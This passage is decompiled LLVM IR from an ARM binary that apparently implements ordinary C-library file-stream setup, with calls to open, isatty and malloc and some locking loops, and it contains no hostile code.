  store i32 %v0_15f20, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_15f2c = inttoptr i32 %v0_15f24 to i32*
  %v3_15f2c = call i32 @__libc_open(i32 %v0_15f20, i32* %v2_15f2c)
  store i32 %v3_15f2c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15f30 = icmp slt i32 %v3_15f2c, 0
  %v1_15f34 = load i32, i32* @r5, align 4
  %v2_15f34 = add i32 %v1_15f34, 4
  %v3_15f34 = inttoptr i32 %v2_15f34 to i32*
  store i32 %v3_15f2c, i32* %v3_15f34, align 4
  br i1 %v1_15f30, label %dec_label_pc_15e40, label %.dec_label_pc_15f3c_crit_edge

.dec_label_pc_15f3c_crit_edge:                    ; preds = %dec_label_pc_15f18._crit_edge
  %v0_15f40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f3c

dec_label_pc_15f3c:                               ; preds = %.dec_label_pc_15f3c_crit_edge, %dec_label_pc_15f0c
  %v0_15f58 = phi i32 [ %v0_15f40.pre, %.dec_label_pc_15f3c_crit_edge ], [ %v2_15f10, %dec_label_pc_15f0c ]
  %v0_15f3c = load i32, i32* @r5, align 4
  %v1_15f3c = inttoptr i32 %v0_15f3c to i16*
  %v2_15f3c = load i16, i16* %v1_15f3c, align 2
  %v3_15f3c = zext i16 %v2_15f3c to i32
  %v1_15f40 = urem i32 %v0_15f58, 4
  %v1_15f44 = and i32 %v0_15f58, 1024
  %v1_15f48 = and i32 %v3_15f3c, 8192
  %v1_15f4c = add nuw nsw i32 %v1_15f40, 1
  %v2_15f50 = or i32 %v1_15f48, %v1_15f44
  store i32 %v2_15f50, i32* %r3.global-to-local, align 4
  %v1_15f54 = xor i32 %v1_15f4c, 3
  %v1_15f58 = and i32 %v0_15f58, 131072
  store i32 %v1_15f58, i32* %r2.global-to-local, align 4
  %v2_15f58 = icmp eq i32 %v1_15f58, 0
  %v1_15f5c = add i32 %v0_15f3c, 4
  %v2_15f5c = inttoptr i32 %v1_15f5c to i32*
  %v3_15f5c = load i32, i32* %v2_15f5c, align 4
  store i32 %v3_15f5c, i32* @r4, align 4
  br i1 %v2_15f58, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_15f3c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_15f3c, %bb54
  %v0_15f68 = phi i32 [ 0, %dec_label_pc_15f3c ], [ 32768, %bb54 ]
  %v4_15f64 = mul nuw nsw i32 %v1_15f54, 16
  %v5_15f64 = or i32 %v2_15f50, %v4_15f64
  store i32 %v5_15f64, i32* %r3.global-to-local, align 4
  %v2_15f68 = or i32 %v0_15f68, %v5_15f64
  store i32 %v2_15f68, i32* %r2.global-to-local, align 4
  %v2_15f6c = icmp ugt i32 %v3_15f5c, 2147483646
  store i1 %v2_15f6c, i1* %cpsr_c.global-to-local, align 1
  %v8_15f6c = icmp eq i32 %v3_15f5c, 2147483647
  %v1_15f70 = trunc i32 %v2_15f68 to i16
  store i16 %v1_15f70, i16* %v1_15f3c, align 2
  br i1 %v8_15f6c, label %dec_label_pc_15fb0, label %dec_label_pc_15f78

dec_label_pc_15f78:                               ; preds = %bb55
  store i32 48608, i32* %r3.global-to-local, align 4
  %v0_15f7c = call i32 @__aeabi_read_tp()
  %v3_15f80 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15f80 = sext i16 %v3_15f80 to i32
  store i32 %v4_15f80, i32* @r3, align 4
  store i32 %v0_15f7c, i32* @r6, align 4
  %v0_15f88 = load i32, i32* @r4, align 4
  store i32 %v0_15f88, i32* @r0, align 4
  %v2_15f8c = add i32 %v4_15f80, %v0_15f7c
  %v3_15f8c = inttoptr i32 %v2_15f8c to i32*
  %v4_15f8c = load i32, i32* %v3_15f8c, align 4
  store i32 %v4_15f8c, i32* @r4, align 4
  %v1_15f90 = call i32 @isatty(i32 %v0_15f88)
  store i32 %v1_15f90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f94 = icmp eq i32 %v1_15f90, 0
  br i1 %v2_15f94, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_15f78
  %v1_15f98 = load i32, i32* @r5, align 4
  %v2_15f98 = inttoptr i32 %v1_15f98 to i16*
  %v3_15f98 = load i16, i16* %v2_15f98, align 2
  %v4_15f98 = zext i16 %v3_15f98 to i32
  %v2_15f9c = or i32 %v4_15f98, 256
  store i32 %v2_15f9c, i32* %r3.global-to-local, align 4
  %v2_15fa0 = trunc i32 %v2_15f9c to i16
  store i16 %v2_15fa0, i16* %v2_15f98, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15f78, %bb56
  %v3_15fa8 = load i16, i16* @global_var_21d68.334, align 2
  %v4_15fa8 = sext i16 %v3_15fa8 to i32
  store i32 %v4_15fa8, i32* %r3.global-to-local, align 4
  %v0_15fac = load i32, i32* @r4, align 4
  %v1_15fac = load i32, i32* @r6, align 4
  %v3_15fac = add i32 %v1_15fac, %v4_15fa8
  %v4_15fac = inttoptr i32 %v3_15fac to i32*
  store i32 %v0_15fac, i32* %v4_15fac, align 4
  br label %dec_label_pc_15fb0

dec_label_pc_15fb0:                               ; preds = %bb55, %.thread5
  %v0_15fb0 = load i32, i32* @r5, align 4
  %v1_15fb0 = add i32 %v0_15fb0, 8
  %v2_15fb0 = inttoptr i32 %v1_15fb0 to i32*
  %v3_15fb0 = load i32, i32* %v2_15fb0, align 4
  store i32 %v3_15fb0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fb4 = icmp eq i32 %v3_15fb0, 0
  br i1 %v2_15fb4, label %dec_label_pc_15fbc, label %bb57

dec_label_pc_15fbc:                               ; preds = %dec_label_pc_15fb0
  store i32 4096, i32* @r0, align 4
  %v0_15fc0 = call i32 @malloc()
  store i32 %v0_15fc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fc4 = icmp eq i32 %v0_15fc0, 0
  %v1_15fd4.pre = load i32, i32* @r5, align 4
  br i1 %v2_15fc4, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15fbc
  %v2_15fc8 = inttoptr i32 %v1_15fd4.pre to i16*
  %v3_15fc8 = load i16, i16* %v2_15fc8, align 2
  %v4_15fc8 = zext i16 %v3_15fc8 to i32
  %v2_15fcc = add i32 %v0_15fc0, 4096
  store i32 %v2_15fcc, i32* %r2.global-to-local, align 4
  %v2_15fd0 = or i32 %v4_15fc8, 16384
  store i32 %v2_15fd0, i32* %r3.global-to-local, align 4
  %v2_15fd4 = add i32 %v1_15fd4.pre, 8
  %v3_15fd4 = inttoptr i32 %v2_15fd4 to i32*
  store i32 %v0_15fc0, i32* %v3_15fd4, align 4
  %v1_15fd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15fd8 = load i32, i32* @r5, align 4
  %v3_15fd8 = add i32 %v2_15fd8, 12
  %v4_15fd8 = inttoptr i32 %v3_15fd8 to i32*
  store i32 %v1_15fd8, i32* %v4_15fd8, align 4
  %v1_15fdc = load i32, i32* %r3.global-to-local, align 4
  %v2_15fdc = trunc i32 %v1_15fdc to i16
  %v3_15fdc = load i32, i32* @r5, align 4
  %v4_15fdc = inttoptr i32 %v3_15fdc to i16*
  store i16 %v2_15fdc, i16* %v4_15fdc, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_15fbc
  %v2_15fd437 = add i32 %v1_15fd4.pre, 8
  %v3_15fd438 = inttoptr i32 %v2_15fd437 to i32*
  store i32 0, i32* %v3_15fd438, align 4
  %v2_15fe0 = load i32, i32* @r5, align 4
  %v3_15fe0 = add i32 %v2_15fe0, 12
  %v4_15fe0 = inttoptr i32 %v3_15fe0 to i32*
  store i32 0, i32* %v4_15fe0, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15fb0, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15fec = load i32, i32* @r8, align 4
  %v2_15fec = add i32 %v0_15fec, 92
  %v3_15fec = inttoptr i32 %v2_15fec to i32*
  %v4_15fec = load i32, i32* %v3_15fec, align 4
  store i32 %v4_15fec, i32* %r3.global-to-local, align 4
  %v2_15ff0 = load i32, i32* @r5, align 4
  %v3_15ff0 = add i32 %v2_15ff0, 2
  %v4_15ff0 = inttoptr i32 %v3_15ff0 to i8*
  store i8 0, i8* %v4_15ff0, align 1
  %v0_15ff4 = load i32, i32* @r5, align 4
  %v1_15ff4 = inttoptr i32 %v0_15ff4 to i16*
  %v2_15ff4 = load i16, i16* %v1_15ff4, align 2
  %v3_15ff4 = zext i16 %v2_15ff4 to i32
  store i32 %v3_15ff4, i32* %r2.global-to-local, align 4
  %v0_15ff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_15ff8 = inttoptr i32 %v0_15ff8 to i32*
  %v2_15ff8 = load i32, i32* %v1_15ff8, align 4
  store i32 %v2_15ff8, i32* @r1, align 4
  %v1_15ffc = add i32 %v0_15ff4, 8
  %v2_15ffc = inttoptr i32 %v1_15ffc to i32*
  %v3_15ffc = load i32, i32* %v2_15ffc, align 4
  store i32 %v3_15ffc, i32* %r3.global-to-local, align 4
  %v1_16000 = and i32 %v3_15ff4, 8192
  %v2_16000 = icmp eq i32 %v1_16000, 0
  %v2_16004 = add i32 %v0_15ff4, 20
  %v3_16004 = inttoptr i32 %v2_16004 to i32*
  store i32 %v3_15ffc, i32* %v3_16004, align 4
  %v0_16008 = load i32, i32* @r1, align 4
  %v1_16008 = load i32, i32* @r5, align 4
  %v2_16008 = add i32 %v1_16008, 52
  %v3_16008 = inttoptr i32 %v2_16008 to i32*
  store i32 %v0_16008, i32* %v3_16008, align 4
  %v0_1600c = load i32, i32* %r3.global-to-local, align 4
  %v1_1600c = load i32, i32* @r5, align 4
  %v2_1600c = add i32 %v1_1600c, 24
  %v3_1600c = inttoptr i32 %v2_1600c to i32*
  store i32 %v0_1600c, i32* %v3_1600c, align 4
  %v0_16010 = load i32, i32* %r3.global-to-local, align 4
  %v1_16010 = load i32, i32* @r5, align 4
  %v2_16010 = add i32 %v1_16010, 28
  %v3_16010 = inttoptr i32 %v2_16010 to i32*
  store i32 %v0_16010, i32* %v3_16010, align 4
  %v0_16014 = load i32, i32* %r3.global-to-local, align 4
  %v1_16014 = load i32, i32* @r5, align 4
  %v2_16014 = add i32 %v1_16014, 16
  %v3_16014 = inttoptr i32 %v2_16014 to i32*
  store i32 %v0_16014, i32* %v3_16014, align 4
  %v0_16018 = load i32, i32* %r4.global-to-local, align 4
  %v1_16018 = load i32, i32* @r5, align 4
  %v2_16018 = add i32 %v1_16018, 44
  %v3_16018 = inttoptr i32 %v2_16018 to i32*
  store i32 %v0_16018, i32* %v3_16018, align 4
  br i1 %v2_16000, label %dec_label_pc_16200, label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16024 = load i32, i32* @r8, align 4
  %v2_16024 = add i32 %v0_16024, 160
  %v3_16024 = inttoptr i32 %v2_16024 to i32*
  %v4_16024 = load i32, i32* %v3_16024, align 4
  store i32 %v4_16024, i32* %r7.global-to-local, align 4
  %v0_16028 = call i32 @__aeabi_read_tp()
  store i32 %v0_16028, i32* %r0.global-to-local, align 4
  %v1_1602c = add i32 %v4_16024, 8
  %v2_1602c = inttoptr i32 %v1_1602c to i32*
  %v3_1602c = load i32, i32* %v2_1602c, align 4
  store i32 %v3_1602c, i32* %r3.global-to-local, align 4
  %v1_16030 = add i32 %v0_16028, -1168
  store i32 %v1_16030, i32* %r6.global-to-local, align 4
  %v3_16034 = icmp uge i32 %v3_1602c, %v1_16030
  store i1 %v3_16034, i1* %cpsr_c.global-to-local, align 1
  %v9_16034 = icmp eq i32 %v3_1602c, %v1_16030
  br i1 %v9_16034, label %dec_label_pc_16078, label %dec_label_pc_1603c

dec_label_pc_1603c:                               ; preds = %dec_label_pc_16020
  store i32 %v4_16024, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16044

dec_label_pc_16044:                               ; preds = %dec_label_pc_16050.dec_label_pc_16044_crit_edge, %dec_label_pc_1603c
  %v0_16044 = phi i32 [ %v0_16044.pre, %dec_label_pc_16050.dec_label_pc_16044_crit_edge ], [ %v4_16024, %dec_label_pc_1603c ]
  %v1_16044 = inttoptr i32 %v0_16044 to i32*
  %v2_16044 = load i32, i32* %v1_16044, align 4
  store i32 %v2_16044, i32* %r3.global-to-local, align 4
  %v1_16048 = load i32, i32* %r4.global-to-local, align 4
  %v3_16048 = icmp uge i32 %v2_16044, %v1_16048
  store i1 %v3_16048, i1* %cpsr_c.global-to-local, align 1
  %v9_16048 = icmp eq i32 %v2_16044, %v1_16048
  br i1 %v9_16048, label %dec_label_pc_16050, label %dec_label_pc_16068

dec_label_pc_16050:                               ; preds = %dec_label_pc_16044
  store i32 %v2_16044, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16060 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16060, label %dec_label_pc_16064, label %dec_label_pc_16050.dec_label_pc_16044_crit_edge

dec_label_pc_16050.dec_label_pc_16044_crit_edge:  ; preds = %dec_label_pc_16050
  %v0_16044.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16044

dec_label_pc_16064:                               ; preds = %dec_label_pc_16050
  %v0_16064 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16064, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %dec_label_pc_16044, %dec_label_pc_16064
  %v0_16068 = phi i32 [ %v0_16064, %dec_label_pc_16064 ], [ %v2_16044, %dec_label_pc_16044 ]
  %v1_16068 = phi i32 [ %v0_16064, %dec_label_pc_16064 ], [ %v1_16048, %dec_label_pc_16044 ]
  %v3_16068 = icmp uge i32 %v0_16068, %v1_16068
  store i1 %v3_16068, i1* %cpsr_c.global-to-local, align 1
  %v9_16068 = icmp eq i32 %v0_16068, %v1_16068
  br i1 %v9_16068, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_16068
  %v1_1606c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1606c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_16068, %bb58
  %v1_16070 = xor i1 %v9_16068, true
  call void @__pseudo_cond_branch(i1 %v1_16070, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_16074 = load i32, i32* %r6.global-to-local, align 4
  %v1_16074 = load i32, i32* %r7.global-to-local, align 4
  %v2_16074 = add i32 %v1_16074, 8
  %v3_16074 = inttoptr i32 %v2_16074 to i32*
  store i32 %v0_16074, i32* %v3_16074, align 4
  %v1_16094.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_16020, %bb59
  %v1_16094 = phi i32 [ %v3_1602c, %dec_label_pc_16020 ], [ %v1_16094.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1607c = load i32, i32* @r8, align 4
  %v2_1607c = add i32 %v0_1607c, 160
  %v3_1607c = inttoptr i32 %v2_1607c to i32*
  %v4_1607c = load i32, i32* %v3_1607c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16084 = add i32 %v0_1607c, 152
  %v3_16084 = inttoptr i32 %v2_16084 to i32*
  %v4_16084 = load i32, i32* %v3_16084, align 4
  store i32 %v4_16084, i32* %r7.global-to-local, align 4
  %v1_16088 = add i32 %v4_1607c, 4
  %v2_16088 = inttoptr i32 %v1_16088 to i32*
  %v3_16088 = load i32, i32* %v2_16088, align 4
  store i32 %v3_16088, i32* %r3.global-to-local, align 4
  %v1_1608c = add i32 %v4_16084, 8
  %v2_1608c = inttoptr i32 %v1_1608c to i32*
  %v3_1608c = load i32, i32* %v2_1608c, align 4
  store i32 %v3_1608c, i32* %r2.global-to-local, align 4
  %v1_16090 = add i32 %v3_16088, 1
  store i32 %v1_16090, i32* %r3.global-to-local, align 4
  %v3_16094 = icmp uge i32 %v3_1608c, %v1_16094
  store i1 %v3_16094, i1* %cpsr_c.global-to-local, align 1
  %v9_16094 = icmp eq i32 %v3_1608c, %v1_16094
  store i32 %v1_16090, i32* %v2_16088, align 4
  br i1 %v9_16094, label %dec_label_pc_160e0, label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16078
  %v0_160a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_160a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_160ac95 = inttoptr i32 %v0_160a4 to i32*
  %v2_160ac96 = load i32, i32* %v1_160ac95, align 4
  store i32 %v2_160ac96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_160b098 = icmp eq i32 %v2_160ac96, 0
  br i1 %v9_160b098, label %dec_label_pc_160b8, label %dec_label_pc_160d0

dec_label_pc_160b8:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge
  %v0_160b899 = phi i32 [ %v1_160b0.pre, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ], [ 0, %dec_label_pc_160a0 ]
  store i32 %v0_160b899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160c8, label %dec_label_pc_160cc, label %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge

dec_label_pc_160b8.dec_label_pc_160ac_crit_edge:  ; preds = %dec_label_pc_160b8
  %v0_160ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_160ac = inttoptr i32 %v0_160ac.pre to i32*
  %v2_160ac = load i32, i32* %v1_160ac, align 4
  store i32 %v2_160ac, i32* %r3.global-to-local, align 4
  %v3_160b0 = icmp uge i32 %v2_160ac, %v1_160b0.pre
  store i1 %v3_160b0, i1* %cpsr_c.global-to-local, align 1
  %v9_160b0 = icmp eq i32 %v2_160ac, %v1_160b0.pre
  br i1 %v9_160b0, label %dec_label_pc_160b8, label %dec_label_pc_160d0

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b8
  %v0_160cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_160cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge, %dec_label_pc_160cc
  %v0_160d0 = phi i32 [ %v0_160cc, %dec_label_pc_160cc ], [ %v2_160ac96, %dec_label_pc_160a0 ], [ %v2_160ac, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ]
  %v1_160d0 = phi i32 [ %v0_160cc, %dec_label_pc_160cc ], [ 0, %dec_label_pc_160a0 ], [ %v1_160b0.pre, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ]
  %v3_160d0 = icmp uge i32 %v0_160d0, %v1_160d0
  store i1 %v3_160d0, i1* %cpsr_c.global-to-local, align 1
  %v9_160d0 = icmp eq i32 %v0_160d0, %v1_160d0
  br i1 %v9_160d0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_160d0
  %v1_160d4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_160d4, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_160d0, %bb60
  %v1_160d8 = xor i1 %v9_160d0, true
  call void @__pseudo_cond_branch(i1 %v1_160d8, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_160dc = load i32, i32* %r6.global-to-local, align 4
  %v1_160dc = load i32, i32* %r7.global-to-local, align 4
  %v2_160dc = add i32 %v1_160dc, 8
  %v3_160dc = inttoptr i32 %v2_160dc to i32*
  store i32 %v0_160dc, i32* %v3_160dc, align 4
  br label %dec_label_pc_160e0

dec_label_pc_160e0:                               ; preds = %dec_label_pc_16078, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_160e4 = load i32, i32* @r8, align 4
  %v2_160e4 = add i32 %v0_160e4, 152
  %v3_160e4 = inttoptr i32 %v2_160e4 to i32*
  %v4_160e4 = load i32, i32* %v3_160e4, align 4
  store i32 %v4_160e4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_160ec = add i32 %v0_160e4, 76
  %v3_160ec = inttoptr i32 %v2_160ec to i32*
  %v4_160ec = load i32, i32* %v3_160ec, align 4
  store i32 %v4_160ec, i32* @r1, align 4
  %v1_160f0 = add i32 %v4_160e4, 4
  %v2_160f0 = inttoptr i32 %v1_160f0 to i32*
  %v3_160f0 = load i32, i32* %v2_160f0, align 4
  store i32 %v3_160f0, i32* %r3.global-to-local, align 4
  %v1_160f4 = inttoptr i32 %v4_160ec to i32*
  %v2_160f4 = load i32, i32* %v1_160f4, align 4
  store i32 %v2_160f4, i32* %r2.global-to-local, align 4
  %v1_160f8 = add i32 %v3_160f0, 1
  store i32 %v1_160f8, i32* %r3.global-to-local, align 4
  store i32 %v1_160f8, i32* %v2_160f0, align 4
  %v0_16100 = load i32, i32* %r2.global-to-local, align 4
  %v1_16100 = load i32, i32* @r5, align 4
  %v2_16100 = add i32 %v1_16100, 32
  %v3_16100 = inttoptr i32 %v2_16100 to i32*
  store i32 %v0_16100, i32* %v3_16100, align 4
  %v0_16104 = load i32, i32* %r0.global-to-local, align 4
  %v1_16104 = add i32 %v0_16104, 4
  %v2_16104 = inttoptr i32 %v1_16104 to i32*
  %v3_16104 = load i32, i32* %v2_16104, align 4
  %v1_16108 = add i32 %v3_16104, -1
  store i32 %v1_16108, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1610c = icmp eq i32 %v1_16108, 0
  %v0_16110 = load i32, i32* @r5, align 4
  %v1_16110 = load i32, i32* @r1, align 4
  %v2_16110 = inttoptr i32 %v1_16110 to i32*
  store i32 %v0_16110, i32* %v2_16110, align 4
  %v0_16114 = load i32, i32* %r3.global-to-local, align 4
  %v1_16114 = load i32, i32* %r0.global-to-local, align 4
  %v2_16114 = add i32 %v1_16114, 4
  %v3_16114 = inttoptr i32 %v2_16114 to i32*
  store i32 %v0_16114, i32* %v3_16114, align 4
  br i1 %v2_1610c, label %dec_label_pc_1611c, label %dec_label_pc_1617c

dec_label_pc_1611c:                               ; preds = %dec_label_pc_160e0
  %v0_1611c = load i32, i32* %r3.global-to-local, align 4
  %v1_1611c = load i32, i32* %r0.global-to-local, align 4
  %v2_1611c = add i32 %v1_1611c, 8
  %v3_1611c = inttoptr i32 %v2_1611c to i32*
  store i32 %v0_1611c, i32* %v3_1611c, align 4
  %v0_16120 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16120, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_16124:                               ; preds = %dec_label_pc_16154.dec_label_pc_16124_crit_edge, %dec_label_pc_1611c
  %v0_16124 = phi i32 [ %v0_16124.pre, %dec_label_pc_16154.dec_label_pc_16124_crit_edge ], [ %v0_16120, %dec_label_pc_1611c ]
  %v1_16124 = inttoptr i32 %v0_16124 to i32*
  %v2_16124 = load i32, i32* %v1_16124, align 4
  store i32 %v2_16124, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16124, i32* %r2.global-to-local, align 4
  %v2_1613083 = load i32, i32* %v1_16124, align 4
  store i32 %v2_1613083, i32* %r3.global-to-local, align 4
  %v3_1613485 = icmp uge i32 %v2_1613083, %v2_16124
  store i1 %v3_1613485, i1* %cpsr_c.global-to-local, align 1
  %v9_1613491 = icmp eq i32 %v2_1613083, %v2_16124
  br i1 %v9_1613491, label %dec_label_pc_1613c, label %dec_label_pc_16154

dec_label_pc_1613c:                               ; preds = %dec_label_pc_16124, %dec_label_pc_1613c.dec_label_pc_16130_crit_edge
  %v0_1613c92 = phi i32 [ %v1_16134.pre, %dec_label_pc_1613c.dec_label_pc_16130_crit_edge ], [ %v2_16124, %dec_label_pc_16124 ]
  store i32 %v0_1613c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1614c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1614c, label %dec_label_pc_16150, label %dec_label_pc_1613c.dec_label_pc_16130_crit_edge

dec_label_pc_1613c.dec_label_pc_16130_crit_edge:  ; preds = %dec_label_pc_1613c
  %v0_16130.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16134.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16130 = inttoptr i32 %v0_16130.pre to i32*
  %v2_16130 = load i32, i32* %v1_16130, align 4
  store i32 %v2_16130, i32* %r3.global-to-local, align 4
  %v3_16134 = icmp uge i32 %v2_16130, %v1_16134.pre
  store i1 %v3_16134, i1* %cpsr_c.global-to-local, align 1
  %v9_16134 = icmp eq i32 %v2_16130, %v1_16134.pre
  br i1 %v9_16134, label %dec_label_pc_1613c, label %dec_label_pc_16154

dec_label_pc_16150:                               ; preds = %dec_label_pc_1613c
  %v0_16150 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16150, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16154

dec_label_pc_16154:                               ; preds = %dec_label_pc_16124, %dec_label_pc_1613c.dec_label_pc_16130_crit_edge, %dec_label_pc_16150
  %v0_1615c = phi i32 [ %v0_16150, %dec_label_pc_16150 ], [ %v2_1613083, %dec_label_pc_16124 ], [ %v2_16130, %dec_label_pc_1613c.dec_label_pc_16130_crit_edge ]
  %v1_16154 = phi i32 [ %v0_16150, %dec_label_pc_16150 ], [ %v2_16124, %dec_label_pc_16124 ], [ %v1_16134.pre, %dec_label_pc_1613c.dec_label_pc_16130_crit_edge ]
  %v3_16154 = icmp uge i32 %v0_1615c, %v1_16154
  store i1 %v3_16154, i1* %cpsr_c.global-to-local, align 1
  %v9_16154 = icmp eq i32 %v0_1615c, %v1_16154
  br i1 %v9_16154, label %dec_label_pc_1615c, label %dec_label_pc_16154.dec_label_pc_16124_crit_edge

dec_label_pc_16154.dec_label_pc_16124_crit_edge:  ; preds = %dec_label_pc_16154
  %v0_16124.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16124

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16154
  %v2_1615c = icmp ne i32 %v1_16154, 0
  store i1 %v2_1615c, i1* %cpsr_c.global-to-local, align 1
  %v7_16160 = icmp slt i32 %v1_16154, 2
  br i1 %v7_16160, label %dec_label_pc_1617c, label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %dec_label_pc_1615c
  %v0_16164 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16164, i32* %r0.global-to-local, align 4
  %v0_16168 = load i32, i32* @r1, align 4
  %v1_16168 = add i32 %v0_16168, 129
  store i32 %v1_16168, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_160e0, %dec_label_pc_16164, %dec_label_pc_1615c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16180 = load i32, i32* @r8, align 4
  %v2_16180 = add i32 %v0_16180, 160
  %v3_16180 = inttoptr i32 %v2_16180 to i32*
  %v4_16180 = load i32, i32* %v3_16180, align 4
  store i32 %v4_16180, i32* %r0.global-to-local, align 4
  %v1_16184 = add i32 %v4_16180, 4
  %v2_16184 = inttoptr i32 %v1_16184 to i32*
  %v3_16184 = load i32, i32* %v2_16184, align 4
  %v1_16188 = add i32 %v3_16184, -1
  store i32 %v1_16188, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1618c = icmp eq i32 %v1_16188, 0
  store i32 %v1_16188, i32* %v2_16184, align 4
  br i1 %v2_1618c, label %dec_label_pc_16198, label %dec_label_pc_16200

dec_label_pc_16198:                               ; preds = %dec_label_pc_1617c
  %v0_16198 = load i32, i32* %r3.global-to-local, align 4
  %v1_16198 = load i32, i32* %r0.global-to-local, align 4
  %v2_16198 = add i32 %v1_16198, 8
  %v3_16198 = inttoptr i32 %v2_16198 to i32*
  store i32 %v0_16198, i32* %v3_16198, align 4
  %v0_1619c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1619c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge, %dec_label_pc_16198
  %v0_161a0 = phi i32 [ %v0_161a0.pre, %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge ], [ %v0_1619c, %dec_label_pc_16198 ]
  %v1_161a0 = inttoptr i32 %v0_161a0 to i32*
  %v2_161a0 = load i32, i32* %v1_161a0, align 4
  store i32 %v2_161a0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_161a0, i32* %r2.global-to-local, align 4
  %v2_161ac71 = load i32, i32* %v1_161a0, align 4
  store i32 %v2_161ac71, i32* %r3.global-to-local, align 4
